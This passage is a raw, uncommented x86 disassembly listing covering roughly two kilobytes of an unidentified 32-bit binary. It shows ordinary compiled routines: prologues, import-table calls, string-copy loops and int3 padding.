   16623:	call   0x15c9e
   16628:	mov    ecx,DWORD PTR [eax]
   1662a:	mov    eax,DWORD PTR [ebp+0x8]
   1662d:	mov    BYTE PTR [eax+0x4],0x1
   16631:	jmp    0x16666
   16633:	mov    DWORD PTR [ebp-0x4],ebx
   16636:	test   al,al
   16638:	je     0x16649
   1663a:	mov    eax,DWORD PTR [edi+0x4]
   1663d:	cmp    ebx,DWORD PTR [eax]
   1663f:	je     0x16618
   16641:	lea    ecx,[ebp-0x4]
   16644:	call   0x133f2
   16649:	push   DWORD PTR [ebp+0xc]
   1664c:	mov    eax,DWORD PTR [ebp-0x4]
   1664f:	add    eax,0xc
   16652:	push   eax
   16653:	call   0x19834
   16658:	test   al,al
   1665a:	jne    0x16618
   1665c:	mov    eax,DWORD PTR [ebp+0x8]
   1665f:	mov    ecx,DWORD PTR [ebp-0x4]
   16662:	mov    BYTE PTR [eax+0x4],0x0
   16666:	pop    edi
   16667:	pop    esi
   16668:	mov    DWORD PTR [eax],ecx
   1666a:	pop    ebx
   1666b:	leave  
   1666c:	ret    0x8
   1666f:	int3   
   16670:	int3   
   16671:	int3   
   16672:	int3   
   16673:	int3   
   16674:	mov    edi,edi
   16676:	push   ebp
   16677:	mov    ebp,esp
   16679:	sub    esp,0x10
   1667c:	push   DWORD PTR [ebp+0x8]
   1667f:	lea    ecx,[ebp-0x10]
   16682:	call   0x15e16
   16687:	push   DWORD PTR [ebp+0xc]
   1668a:	mov    ecx,DWORD PTR [ebp+0x8]
   1668d:	call   0x15e42
   16692:	mov    ecx,DWORD PTR [ebp+0xc]
   16695:	lea    eax,[ebp-0x10]
   16698:	push   eax
   16699:	call   0x15e42
   1669e:	lea    ecx,[ebp-0x10]
   166a1:	call   0x160fe
   166a6:	leave  
   166a7:	ret    0x8
   166aa:	int3   
   166ab:	int3   
   166ac:	int3   
   166ad:	int3   
   166ae:	int3   
   166af:	int3   
   166b0:	mov    edi,edi
   166b2:	push   ebp
   166b3:	mov    ebp,esp
   166b5:	push   esi
   166b6:	push   edi
   166b7:	xor    edi,edi
   166b9:	push   edi
   166ba:	push   edi
   166bb:	push   edi
   166bc:	mov    esi,ecx
   166be:	mov    eax,DWORD PTR [esi+0x10]
   166c1:	push   edi
   166c2:	push   eax
   166c3:	call   DWORD PTR ds:0x1f028
   166c9:	test   eax,eax
   166cb:	jl     0x166e2
   166cd:	lea    eax,[ebp+0x8]
   166d0:	push   eax
   166d1:	mov    ecx,esi
   166d3:	call   0x14c88
   166d8:	push   edi
   166d9:	push   DWORD PTR [esi+0x10]
   166dc:	call   DWORD PTR ds:0x1f024
   166e2:	pop    edi
   166e3:	pop    esi
   166e4:	pop    ebp
   166e5:	ret    0x4
   166e8:	int3   
   166e9:	int3   
   166ea:	int3   
   166eb:	int3   
   166ec:	int3   
   166ed:	int3   
   166ee:	mov    edi,edi
   166f0:	push   ebp
   166f1:	mov    ebp,esp
   166f3:	sub    esp,0x50
   166f6:	test   BYTE PTR [ebp+0x8],0x20
   166fa:	je     0x167a9
   16700:	push   ebx
   16701:	lea    ecx,[ebp-0x50]
   16704:	call   0x136d8
   16709:	mov    ecx,DWORD PTR ds:0x7ed00
   1670f:	lea    eax,[ebp-0x50]
   16712:	push   eax
   16713:	push   DWORD PTR [ebp+0xc]
   16716:	call   0x16096
   1671b:	test   al,al
   1671d:	je     0x167a5
   16723:	mov    ecx,DWORD PTR [ebp+0x10]
   16726:	lea    eax,[ebp-0x48]
   16729:	push   eax
   1672a:	call   0x129cc
   1672f:	mov    eax,DWORD PTR [ebp+0x14]
   16732:	mov    ecx,DWORD PTR [ebp-0x40]
   16735:	mov    DWORD PTR [eax],ecx
   16737:	mov    ecx,DWORD PTR [ebp+0x18]
   1673a:	lea    eax,[ebp-0x3c]
   1673d:	push   eax
   1673e:	call   0x129cc
   16743:	mov    ecx,DWORD PTR [ebp+0x1c]
   16746:	lea    eax,[ebp-0x34]
   16749:	push   eax
   1674a:	call   0x129cc
   1674f:	mov    ecx,DWORD PTR [ebp+0x20]
   16752:	lea    eax,[ebp-0x2c]
   16755:	push   eax
   16756:	call   0x129cc
   1675b:	mov    eax,DWORD PTR [ebp+0x28]
   1675e:	mov    ecx,DWORD PTR [ebp-0x24]
   16761:	mov    DWORD PTR [eax],ecx
   16763:	mov    ecx,DWORD PTR [ebp+0x24]
   16766:	lea    eax,[ebp-0x8]
   16769:	push   eax
   1676a:	call   0x129cc
   1676f:	mov    eax,DWORD PTR [ebp+0x30]
   16772:	mov    ecx,DWORD PTR [ebp-0x18]
   16775:	mov    DWORD PTR [eax],ecx
   16777:	mov    ecx,DWORD PTR [ebp-0x14]
   1677a:	mov    DWORD PTR [eax+0x4],ecx
   1677d:	mov    eax,DWORD PTR [ebp+0x34]
   16780:	mov    ecx,DWORD PTR [ebp-0x10]
   16783:	mov    DWORD PTR [eax],ecx
   16785:	mov    ecx,DWORD PTR [ebp-0xc]
   16788:	mov    DWORD PTR [eax+0x4],ecx
   1678b:	mov    eax,DWORD PTR [ebp+0x2c]
   1678e:	mov    ecx,DWORD PTR [ebp-0x20]
   16791:	mov    DWORD PTR [eax],ecx
   16793:	mov    bl,0x1
   16795:	lea    ecx,[ebp-0x50]
   16798:	call   0x11ece
   1679d:	mov    al,bl
   1679f:	pop    ebx
   167a0:	jmp    0x16840
   167a5:	xor    bl,bl
   167a7:	jmp    0x16795
   167a9:	mov    ecx,DWORD PTR ds:0x7ecf8
   167af:	push   esi
   167b0:	push   DWORD PTR [ebp+0xc]
   167b3:	lea    eax,[ebp+0xc]
   167b6:	push   eax
   167b7:	call   0x13c3c
   167bc:	mov    esi,DWORD PTR [ebp+0xc]
   167bf:	mov    eax,ds:0x7ecf8
   167c4:	cmp    esi,DWORD PTR [eax+0x4]
   167c7:	jne    0x167cd
   167c9:	xor    al,al
   167cb:	jmp    0x1683f
   167cd:	mov    ecx,DWORD PTR [ebp+0x10]
   167d0:	lea    eax,[esi+0x20]
   167d3:	push   eax
   167d4:	call   0x129cc
   167d9:	mov    eax,DWORD PTR [esi+0x28]
   167dc:	mov    ecx,DWORD PTR [ebp+0x14]
   167df:	mov    DWORD PTR [ecx],eax
   167e1:	mov    ecx,DWORD PTR [ebp+0x18]
   167e4:	lea    eax,[esi+0x2c]
   167e7:	push   eax
   167e8:	call   0x129cc
   167ed:	mov    ecx,DWORD PTR [ebp+0x1c]
   167f0:	lea    eax,[esi+0x34]
   167f3:	push   eax
   167f4:	call   0x129cc
   167f9:	mov    ecx,DWORD PTR [ebp+0x20]
   167fc:	lea    eax,[esi+0x3c]
   167ff:	push   eax
   16800:	call   0x129cc
   16805:	mov    ecx,DWORD PTR [ebp+0x24]
   16808:	lea    eax,[esi+0x60]
   1680b:	push   eax
   1680c:	call   0x129cc
   16811:	mov    eax,DWORD PTR [esi+0x44]
   16814:	mov    ecx,DWORD PTR [ebp+0x28]
   16817:	mov    DWORD PTR [ecx],eax
   16819:	mov    ecx,DWORD PTR [esi+0x50]
   1681c:	mov    eax,DWORD PTR [ebp+0x30]
   1681f:	mov    DWORD PTR [eax],ecx
   16821:	mov    ecx,DWORD PTR [esi+0x54]
   16824:	mov    DWORD PTR [eax+0x4],ecx
   16827:	mov    ecx,DWORD PTR [esi+0x58]
   1682a:	mov    eax,DWORD PTR [ebp+0x34]
   1682d:	mov    DWORD PTR [eax],ecx
   1682f:	mov    ecx,DWORD PTR [esi+0x5c]
   16832:	mov    DWORD PTR [eax+0x4],ecx
   16835:	mov    eax,DWORD PTR [esi+0x48]
   16838:	mov    ecx,DWORD PTR [ebp+0x2c]
   1683b:	mov    DWORD PTR [ecx],eax
   1683d:	mov    al,0x1
   1683f:	pop    esi
   16840:	leave  
   16841:	ret    0x30
   16844:	int3   
   16845:	int3   
   16846:	int3   
   16847:	int3   
   16848:	int3   
   16849:	int3   
   1684a:	push   0x54
   1684c:	push   0x7df48
   16851:	call   0x1db1c
   16856:	xor    esi,esi
   16858:	push   esi
   16859:	push   esi
   1685a:	push   esi
   1685b:	push   esi
   1685c:	push   0x7eb70
   16861:	call   DWORD PTR ds:0x1f028
   16867:	cmp    eax,esi
   16869:	jl     0x16a2a
   1686f:	mov    DWORD PTR [ebp-0x4],esi
   16872:	or     edi,0xffffffff
   16875:	push   edi
   16876:	mov    esi,0x1df30
   1687b:	push   esi
   1687c:	lea    ecx,[ebp-0x54]
   1687f:	call   0x110ae
   16884:	push   edi
   16885:	push   esi
   16886:	lea    ecx,[ebp-0x4c]
   16889:	call   0x110ae
   1688e:	push   edi
   1688f:	push   esi
   16890:	lea    ecx,[ebp-0x44]
   16893:	call   0x110ae
   16898:	push   edi
   16899:	push   esi
   1689a:	lea    ecx,[ebp-0x3c]
   1689d:	call   0x110ae
   168a2:	push   edi
   168a3:	push   esi
   168a4:	lea    ecx,[ebp-0x34]
   168a7:	call   0x110ae
   168ac:	lea    eax,[ebp-0x64]
   168af:	push   eax
   168b0:	lea    eax,[ebp-0x5c]
   168b3:	push   eax
   168b4:	lea    eax,[ebp-0x20]
   168b7:	push   eax
   168b8:	lea    eax,[ebp-0x1c]
   168bb:	push   eax
   168bc:	lea    eax,[ebp-0x34]
   168bf:	push   eax
   168c0:	lea    eax,[ebp-0x3c]
   168c3:	push   eax
   168c4:	lea    eax,[ebp-0x44]
   168c7:	push   eax
   168c8:	lea    eax,[ebp-0x54]
   168cb:	push   eax
   168cc:	lea    eax,[ebp-0x24]
   168cf:	push   eax
   168d0:	lea    eax,[ebp-0x4c]
   168d3:	push   eax
   168d4:	mov    edi,DWORD PTR [ebp+0x8]
   168d7:	push   edi
   168d8:	mov    esi,DWORD PTR [ebp+0xc]
   168db:	push   DWORD PTR [esi+0x4]
   168de:	call   0x166ee
   168e3:	test   al,al
   168e5:	jne    0x168f3
   168e7:	mov    DWORD PTR [esi+0x8],0x1
   168ee:	jmp    0x169d8
   168f3:	mov    edx,DWORD PTR [edi+0x4]
   168f6:	mov    eax,DWORD PTR [ebp-0x48]
   168f9:	lea    ecx,[eax+edx*1+0x2]
   168fd:	mov    eax,DWORD PTR [ebp-0x50]
   16900:	lea    edi,[eax+ecx*1+0x5]
   16904:	mov    eax,DWORD PTR [ebp-0x40]
   16907:	lea    eax,[eax+edi*1+0x1]
   1690b:	mov    DWORD PTR [ebp-0x28],eax
   1690e:	mov    ebx,DWORD PTR [ebp-0x38]
   16911:	lea    eax,[ebx+eax*1+0x1]
   16915:	mov    DWORD PTR [ebp-0x2c],eax
   16918:	mov    ebx,DWORD PTR [ebp-0x30]
   1691b:	lea    eax,[ebx+eax*1+0x1]
   1691f:	cmp    eax,DWORD PTR [esi]
   16921:	jbe    0x16931
   16923:	mov    DWORD PTR [esi],eax
   16925:	mov    DWORD PTR [esi+0x8],0x2
   1692c:	jmp    0x169d8
   16931:	and    DWORD PTR [esi+0x8],0x0
   16935:	mov    eax,DWORD PTR [ebp-0x1c]
   16938:	mov    DWORD PTR [esi+0xc],eax
   1693b:	mov    eax,DWORD PTR [ebp-0x5c]
   1693e:	mov    DWORD PTR [esi+0x18],eax
   16941:	mov    eax,DWORD PTR [ebp-0x58]
   16944:	mov    DWORD PTR [esi+0x1c],eax
   16947:	mov    eax,DWORD PTR [ebp-0x64]
   1694a:	mov    DWORD PTR [esi+0x20],eax
   1694d:	mov    eax,DWORD PTR [ebp-0x60]
   16950:	mov    DWORD PTR [esi+0x24],eax
   16953:	mov    eax,DWORD PTR [ebp-0x20]
   16956:	mov    DWORD PTR [esi+0x10],eax
   16959:	mov    eax,DWORD PTR [ebp+0x8]
   1695c:	mov    eax,DWORD PTR [eax]
   1695e:	mov    DWORD PTR [ebp-0x1c],eax
   16961:	lea    eax,[esi+0x28]
   16964:	mov    ebx,DWORD PTR [ebp-0x1c]
   16967:	mov    bl,BYTE PTR [ebx]
   16969:	mov    BYTE PTR [ebp+0xb],bl
   1696c:	mov    BYTE PTR [eax],bl
   1696e:	inc    DWORD PTR [ebp-0x1c]
   16971:	inc    eax
   16972:	test   bl,bl
   16974:	jne    0x16964
   16976:	mov    ebx,DWORD PTR [ebp-0x4c]
   16979:	lea    edx,[edx+esi*1+0x29]
   1697d:	mov    al,BYTE PTR [ebx]
   1697f:	mov    BYTE PTR [edx],al
   16981:	inc    ebx
   16982:	inc    edx
   16983:	test   al,al
   16985:	jne    0x1697d
   16987:	mov    eax,DWORD PTR [ebp-0x24]
   1698a:	mov    DWORD PTR [ecx+esi*1+0x28],eax
   1698e:	mov    edx,DWORD PTR [ebp-0x54]
   16991:	lea    ecx,[ecx+esi*1+0x2c]
   16995:	mov    al,BYTE PTR [edx]
   16997:	mov    BYTE PTR [ecx],al
   16999:	inc    edx
   1699a:	inc    ecx
   1699b:	test   al,al
   1699d:	jne    0x16995
   1699f:	mov    ecx,DWORD PTR [ebp-0x44]
   169a2:	lea    edi,[edi+esi*1+0x28]
   169a6:	mov    al,BYTE PTR [ecx]
   169a8:	mov    BYTE PTR [edi],al
   169aa:	inc    ecx
   169ab:	inc    edi
   169ac:	test   al,al
   169ae:	jne    0x169a6
   169b0:	mov    edx,DWORD PTR [ebp-0x3c]
   169b3:	mov    eax,DWORD PTR [ebp-0x28]
   169b6:	lea    eax,[eax+esi*1+0x28]
   169ba:	mov    cl,BYTE PTR [edx]
   169bc:	mov    BYTE PTR [eax],cl
   169be:	inc    edx
   169bf:	inc    eax
   169c0:	test   cl,cl
   169c2:	jne    0x169ba
   169c4:	mov    ecx,DWORD PTR [ebp-0x34]
   169c7:	mov    eax,DWORD PTR [ebp-0x2c]
   169ca:	lea    esi,[eax+esi*1+0x28]
   169ce:	mov    al,BYTE PTR [ecx]
   169d0:	mov    BYTE PTR [esi],al
   169d2:	inc    ecx
   169d3:	inc    esi
   169d4:	test   al,al
   169d6:	jne    0x169ce
   169d8:	push   DWORD PTR [ebp-0x34]
   169db:	call   0x10a9a
   169e0:	push   DWORD PTR [ebp-0x3c]
   169e3:	call   0x10a9a
   169e8:	push   DWORD PTR [ebp-0x44]
   169eb:	call   0x10a9a
   169f0:	push   DWORD PTR [ebp-0x4c]
   169f3:	call   0x10a9a
   169f8:	push   DWORD PTR [ebp-0x54]
   169fb:	call   0x10a9a
   16a00:	add    esp,0x14
   16a03:	jmp    0x16a16
   16a05:	xor    eax,eax
   16a07:	inc    eax
   16a08:	ret    
   16a09:	mov    esp,DWORD PTR [ebp-0x18]
   16a0c:	mov    eax,DWORD PTR [ebp+0xc]
   16a0f:	mov    DWORD PTR [eax+0x8],0x4
   16a16:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   16a1d:	push   0x0
   16a1f:	push   0x7eb70
   16a24:	call   DWORD PTR ds:0x1f024
   16a2a:	call   0x1db61
   16a2f:	ret    0x8
   16a32:	int3   
   16a33:	int3   
   16a34:	int3   
   16a35:	int3   
   16a36:	int3   
   16a37:	int3   
   16a38:	mov    edi,edi
   16a3a:	push   ebp
   16a3b:	mov    ebp,esp
   16a3d:	sub    esp,0x10
   16a40:	mov    eax,DWORD PTR [ebp+0x8]
   16a43:	mov    eax,DWORD PTR [eax]
   16a45:	and    DWORD PTR [ebp-0x4],0x0
   16a49:	mov    DWORD PTR [ebp-0x8],eax
   16a4c:	lea    eax,[ebp-0x8]
   16a4f:	push   eax
   16a50:	lea    eax,[ebp-0x10]
   16a53:	push   eax
   16a54:	call   0x16150
   16a59:	mov    eax,DWORD PTR [eax]
   16a5b:	add    eax,0x10
   16a5e:	leave  
   16a5f:	ret    0x4
   16a62:	int3   
   16a63:	int3   
   16a64:	int3   
   16a65:	int3   
   16a66:	int3   
   16a67:	int3   
   16a68:	mov    edi,edi
   16a6a:	push   esi
   16a6b:	mov    esi,ecx
   16a6d:	mov    BYTE PTR [esi+0x8],0x0
   16a71:	call   0x14128
   16a76:	mov    eax,esi
   16a78:	pop    esi
   16a79:	ret    0x8
   16a7c:	int3   
   16a7d:	int3   
   16a7e:	int3   
   16a7f:	int3   
   16a80:	int3   
   16a81:	int3   
   16a82:	mov    edi,edi
   16a84:	push   ebp
   16a85:	mov    ebp,esp
   16a87:	push   ecx
   16a88:	push   ecx
   16a89:	push   DWORD PTR [ebp+0xc]
   16a8c:	lea    eax,[ebp-0x8]
   16a8f:	push   eax
   16a90:	call   0x161fa
   16a95:	mov    eax,DWORD PTR [ebp+0x8]
   16a98:	mov    ecx,DWORD PTR [ebp-0x8]
   16a9b:	mov    DWORD PTR [eax],ecx
   16a9d:	mov    cl,BYTE PTR [ebp-0x4]
   16aa0:	mov    BYTE PTR [eax+0x4],cl
   16aa3:	leave  
   16aa4:	ret    0x8
   16aa7:	int3   
   16aa8:	int3   
   16aa9:	int3   
   16aaa:	int3   
   16aab:	int3   
   16aac:	mov    edi,edi
   16aae:	push   ebp
   16aaf:	mov    ebp,esp
   16ab1:	push   ecx
   16ab2:	push   esi
   16ab3:	mov    esi,ecx
   16ab5:	mov    eax,DWORD PTR [esi+0x4]
   16ab8:	mov    ecx,DWORD PTR [eax]
   16aba:	push   eax
   16abb:	push   ecx
   16abc:	lea    eax,[ebp-0x4]
   16abf:	push   eax
   16ac0:	mov    ecx,esi
   16ac2:	call   0x16294
   16ac7:	push   DWORD PTR [esi+0x4]
   16aca:	call   0x10a9a
   16acf:	xor    eax,eax
   16ad1:	mov    DWORD PTR [esi+0x4],eax
   16ad4:	mov    DWORD PTR [esi+0xc],eax
   16ad7:	dec    DWORD PTR ds:0x7f834
   16add:	pop    ecx
   16ade:	pop    esi
   16adf:	jne    0x16af7
   16ae1:	mov    ecx,DWORD PTR ds:0x7f6d0
   16ae7:	mov    ds:0x7f6d0,eax
   16aec:	cmp    ecx,eax
   16aee:	je     0x16af7
   16af0:	push   ecx
   16af1:	call   0x10a9a
   16af6:	pop    ecx
   16af7:	leave  
   16af8:	ret    
   16af9:	int3   
   16afa:	int3   
   16afb:	int3   
   16afc:	int3   
   16afd:	int3   
   16afe:	mov    edi,edi
   16b00:	push   ebp
   16b01:	mov    ebp,esp
   16b03:	push   ecx
   16b04:	push   ecx
   16b05:	push   DWORD PTR [ebp+0xc]
   16b08:	lea    eax,[ebp-0x8]
   16b0b:	push   eax
   16b0c:	call   0x16312
   16b11:	mov    eax,DWORD PTR [ebp+0x8]
   16b14:	mov    ecx,DWORD PTR [ebp-0x8]
   16b17:	mov    DWORD PTR [eax],ecx
   16b19:	mov    cl,BYTE PTR [ebp-0x4]
   16b1c:	mov    BYTE PTR [eax+0x4],cl
   16b1f:	leave  
   16b20:	ret    0x8
   16b23:	int3   
   16b24:	int3   
   16b25:	int3   
   16b26:	int3   
   16b27:	int3   
   16b28:	mov    edi,edi
   16b2a:	push   ebp
   16b2b:	mov    ebp,esp
   16b2d:	push   ecx
   16b2e:	mov    eax,DWORD PTR [ecx+0x4]
   16b31:	mov    edx,DWORD PTR [eax]
   16b33:	push   eax
   16b34:	push   edx
   16b35:	lea    eax,[ebp-0x4]
   16b38:	push   eax
   16b39:	call   0x163ac
   16b3e:	leave  
   16b3f:	ret    
   16b40:	int3   
   16b41:	int3   
   16b42:	int3   
   16b43:	int3   
   16b44:	int3   
   16b45:	int3   
   16b46:	mov    edi,edi
   16b48:	push   ebp
   16b49:	mov    ebp,esp
   16b4b:	push   ecx
   16b4c:	push   ecx
   16b4d:	push   DWORD PTR [ebp+0xc]
   16b50:	lea    eax,[ebp-0x8]
   16b53:	push   eax
   16b54:	call   0x1642a
   16b59:	mov    eax,DWORD PTR [ebp+0x8]
   16b5c:	mov    ecx,DWORD PTR [ebp-0x8]
   16b5f:	mov    DWORD PTR [eax],ecx
   16b61:	mov    cl,BYTE PTR [ebp-0x4]
   16b64:	mov    BYTE PTR [eax+0x4],cl
   16b67:	leave  
   16b68:	ret    0x8
   16b6b:	int3   
   16b6c:	int3   
   16b6d:	int3   
   16b6e:	int3   
   16b6f:	int3   
   16b70:	mov    edi,edi
   16b72:	push   ebp
   16b73:	mov    ebp,esp
   16b75:	push   ecx
   16b76:	push   ecx
   16b77:	push   DWORD PTR [ebp+0xc]
   16b7a:	lea    eax,[ebp-0x8]
   16b7d:	push   eax
   16b7e:	call   0x164c4
   16b83:	mov    eax,DWORD PTR [ebp+0x8]
   16b86:	mov    ecx,DWORD PTR [ebp-0x8]
   16b89:	mov    DWORD PTR [eax],ecx
   16b8b:	mov    cl,BYTE PTR [ebp-0x4]
   16b8e:	mov    BYTE PTR [eax+0x4],cl
   16b91:	leave  
   16b92:	ret    0x8
   16b95:	int3   
   16b96:	int3   
   16b97:	int3   
   16b98:	int3   
   16b99:	int3   
   16b9a:	mov    edi,edi
   16b9c:	push   ebp
   16b9d:	mov    ebp,esp
   16b9f:	push   ecx
   16ba0:	push   ecx
   16ba1:	push   esi
   16ba2:	push   DWORD PTR [ebp+0x8]
   16ba5:	lea    eax,[ebp-0x8]
   16ba8:	push   eax
   16ba9:	mov    esi,ecx
   16bab:	call   0x1418a
   16bb0:	and    DWORD PTR [ebp+0x8],0x0
   16bb4:	lea    eax,[ebp+0x8]
   16bb7:	push   eax
   16bb8:	push   DWORD PTR [ebp-0x4]
   16bbb:	push   DWORD PTR [ebp-0x8]
   16bbe:	call   0x13a80
   16bc3:	add    esp,0xc
   16bc6:	push   DWORD PTR [ebp-0x4]
   16bc9:	lea    eax,[ebp-0x4]
   16bcc:	push   DWORD PTR [ebp-0x8]
   16bcf:	mov    ecx,esi
   16bd1:	push   eax
   16bd2:	call   0x1655c
   16bd7:	mov    eax,DWORD PTR [ebp+0x8]
   16bda:	pop    esi
   16bdb:	leave  
   16bdc:	ret    0x4
   16bdf:	int3   
   16be0:	int3   
   16be1:	int3   
   16be2:	int3   
   16be3:	int3   
   16be4:	mov    edi,edi
   16be6:	push   ebp
   16be7:	mov    ebp,esp
   16be9:	push   ecx
   16bea:	mov    eax,DWORD PTR [ecx+0x4]
   16bed:	mov    edx,DWORD PTR [eax]
   16bef:	push   eax
   16bf0:	push   edx
   16bf1:	lea    eax,[ebp-0x4]
   16bf4:	push   eax
   16bf5:	call   0x1655c
   16bfa:	leave  
   16bfb:	ret    
   16bfc:	int3   
   16bfd:	int3   
   16bfe:	int3   
   16bff:	int3   
   16c00:	int3   
   16c01:	int3   
   16c02:	mov    edi,edi
   16c04:	push   ebp
   16c05:	mov    ebp,esp
   16c07:	push   ecx
   16c08:	push   ecx
   16c09:	push   DWORD PTR [ebp+0xc]
   16c0c:	lea    eax,[ebp-0x8]
   16c0f:	push   eax
   16c10:	call   0x165da
   16c15:	mov    eax,DWORD PTR [ebp+0x8]
   16c18:	mov    ecx,DWORD PTR [ebp-0x8]
   16c1b:	mov    DWORD PTR [eax],ecx
   16c1d:	mov    cl,BYTE PTR [ebp-0x4]
   16c20:	mov    BYTE PTR [eax+0x4],cl
   16c23:	leave  
   16c24:	ret    0x8
   16c27:	int3   
   16c28:	int3   
   16c29:	int3   
   16c2a:	int3   
   16c2b:	int3   
   16c2c:	mov    edi,edi
   16c2e:	push   esi
   16c2f:	mov    esi,ecx
   16c31:	push   edi
   16c32:	mov    BYTE PTR [esi+0x8],0x0
   16c36:	call   0x14000
   16c3b:	lea    edi,[esi+0x10]
   16c3e:	mov    ecx,edi
   16c40:	call   0x12a16
   16c45:	mov    edi,DWORD PTR [edi]
   16c47:	push   0x0
   16c49:	push   edi
   16c4a:	call   0x11c32
   16c4f:	call   eax
   16c51:	pop    edi
   16c52:	mov    eax,esi
   16c54:	pop    esi
   16c55:	ret    
   16c56:	int3   
   16c57:	int3   
   16c58:	int3   
   16c59:	int3   
   16c5a:	int3   
   16c5b:	int3   
   16c5c:	mov    edi,edi
   16c5e:	push   ebp
   16c5f:	mov    ebp,esp
   16c61:	push   esi
   16c62:	push   edi
   16c63:	xor    edi,edi
   16c65:	push   edi
   16c66:	push   edi
   16c67:	push   edi
   16c68:	mov    esi,ecx
   16c6a:	mov    eax,DWORD PTR [esi+0x10]
   16c6d:	push   edi
   16c6e:	push   eax
   16c6f:	call   DWORD PTR ds:0x1f028
   16c75:	test   eax,eax
   16c77:	jl     0x16c93
   16c79:	lea    eax,[ebp+0x8]
   16c7c:	push   eax
   16c7d:	mov    ecx,esi
   16c7f:	call   0x16a38
   16c84:	mov    ecx,DWORD PTR [ebp+0xc]
   16c87:	push   edi
   16c88:	mov    DWORD PTR [eax],ecx
   16c8a:	push   DWORD PTR [esi+0x10]
   16c8d:	call   DWORD PTR ds:0x1f024
   16c93:	pop    edi
   16c94:	pop    esi
   16c95:	pop    ebp
   16c96:	ret    0x8
   16c99:	int3   
   16c9a:	int3   
   16c9b:	int3   
   16c9c:	int3   
   16c9d:	int3   
   16c9e:	mov    edi,edi
   16ca0:	push   ebp
   16ca1:	mov    ebp,esp
   16ca3:	sub    esp,0x38
   16ca6:	push   esi
   16ca7:	call   0x1a2b0
   16cac:	test   al,al
   16cae:	jne    0x16cb8
   16cb0:	mov    eax,DWORD PTR [ebp+0x8]
   16cb3:	jmp    0x16d89
   16cb8:	push   DWORD PTR [ebp+0xc]
   16cbb:	lea    ecx,[ebp-0x8]
   16cbe:	push   DWORD PTR [ebp+0x8]
   16cc1:	call   0x12b1a
   16cc6:	mov    ecx,DWORD PTR ds:0x7f860
   16ccc:	lea    eax,[ebp-0x8]
   16ccf:	push   eax
   16cd0:	lea    eax,[ebp+0xc]
   16cd3:	push   eax
   16cd4:	call   0x1421e
   16cd9:	mov    esi,DWORD PTR [ebp+0xc]
   16cdc:	mov    eax,ds:0x7f860
   16ce1:	cmp    esi,DWORD PTR [eax+0x4]
   16ce4:	jne    0x16d44
   16ce6:	push   ecx
   16ce7:	push   ecx
   16ce8:	lea    eax,[ebp-0x8]
   16ceb:	mov    ecx,esp
   16ced:	push   eax
   16cee:	call   0x12b3a
   16cf3:	lea    eax,[ebp-0x10]
   16cf6:	push   eax
   16cf7:	call   0x12bb8
   16cfc:	lea    eax,[ebp-0x10]
   16cff:	push   eax
   16d00:	lea    eax,[ebp-0x8]
   16d03:	push   eax
   16d04:	lea    ecx,[ebp-0x38]
   16d07:	call   0x13608
   16d0c:	lea    eax,[ebp-0x38]
   16d0f:	push   eax
   16d10:	lea    ecx,[ebp-0x28]
   16d13:	call   0x135b4
   16d18:	mov    ecx,DWORD PTR ds:0x7f860
   16d1e:	lea    eax,[ebp-0x28]
   16d21:	push   eax
   16d22:	lea    eax,[ebp-0x18]
   16d25:	push   eax
   16d26:	call   0x16c02
   16d2b:	lea    ecx,[ebp-0x28]
   16d2e:	call   0x12afc
   16d33:	lea    ecx,[ebp-0x38]
   16d36:	call   0x12afc
   16d3b:	push   DWORD PTR [ebp-0x10]
   16d3e:	call   0x10a9a
   16d43:	pop    ecx
   16d44:	mov    eax,DWORD PTR [ebp+0x10]
   16d47:	movzx  eax,BYTE PTR [eax]
   16d4a:	cmp    eax,0x100
   16d4f:	jge    0x16d67
   16d51:	mov    ecx,DWORD PTR ds:0x7f860
   16d57:	lea    eax,[ebp-0x8]
   16d5a:	push   eax
   16d5b:	lea    eax,[ebp+0xc]
   16d5e:	push   eax
   16d5f:	call   0x1421e
   16d64:	mov    esi,DWORD PTR [ebp+0xc]
   16d67:	mov    eax,ds:0x7f860
   16d6c:	cmp    esi,DWORD PTR [eax+0x4]
   16d6f:	je     0x16d76
   16d71:	mov    esi,DWORD PTR [esi+0x14]
   16d74:	jmp    0x16d79
   16d76:	mov    esi,DWORD PTR [ebp+0x8]
   16d79:	call   0x1a218
   16d7e:	push   DWORD PTR [ebp-0x8]
   16d81:	call   0x10a9a
   16d86:	pop    ecx
   16d87:	mov    eax,esi
   16d89:	pop    esi
   16d8a:	leave  
   16d8b:	ret    0xc
   16d8e:	int3   
   16d8f:	int3   
   16d90:	int3   
   16d91:	int3   
   16d92:	int3   
   16d93:	int3   
   16d94:	mov    edi,edi
   16d96:	push   ebp
   16d97:	mov    ebp,esp
   16d99:	sub    esp,0x38
   16d9c:	push   esi
   16d9d:	call   0x1a2b0
   16da2:	test   al,al
   16da4:	jne    0x16dae
   16da6:	mov    eax,DWORD PTR [ebp+0x8]
   16da9:	jmp    0x16e7f
   16dae:	push   DWORD PTR [ebp+0xc]
   16db1:	lea    ecx,[ebp-0x8]
   16db4:	push   DWORD PTR [ebp+0x8]
   16db7:	call   0x1298a
   16dbc:	mov    ecx,DWORD PTR ds:0x7f864
   16dc2:	lea    eax,[ebp-0x8]
   16dc5:	push   eax
   16dc6:	lea    eax,[ebp+0xc]
   16dc9:	push   eax
   16dca:	call   0x13c84
   16dcf:	mov    esi,DWORD PTR [ebp+0xc]
   16dd2:	mov    eax,ds:0x7f864
   16dd7:	cmp    esi,DWORD PTR [eax+0x4]
   16dda:	jne    0x16e3a
   16ddc:	push   ecx
   16ddd:	push   ecx
   16dde:	lea    eax,[ebp-0x8]
   16de1:	mov    ecx,esp
   16de3:	push   eax
   16de4:	call   0x129aa
   16de9:	lea    eax,[ebp-0x10]
   16dec:	push   eax
   16ded:	call   0x12bfc
   16df2:	lea    eax,[ebp-0x10]
   16df5:	push   eax
   16df6:	lea    eax,[ebp-0x8]
   16df9:	push   eax
   16dfa:	lea    ecx,[ebp-0x38]
   16dfd:	call   0x12c3c
   16e02:	lea    eax,[ebp-0x38]
   16e05:	push   eax
   16e06:	lea    ecx,[ebp-0x28]
   16e09:	call   0x13532
   16e0e:	mov    ecx,DWORD PTR ds:0x7f864
   16e14:	lea    eax,[ebp-0x28]
   16e17:	push   eax
   16e18:	lea    eax,[ebp-0x18]
   16e1b:	push   eax
   16e1c:	call   0x16b46
   16e21:	lea    ecx,[ebp-0x28]
   16e24:	call   0x12afc
   16e29:	lea    ecx,[ebp-0x38]
   16e2c:	call   0x12afc
   16e31:	push   DWORD PTR [ebp-0x10]
   16e34:	call   0x10a9a
   16e39:	pop    ecx
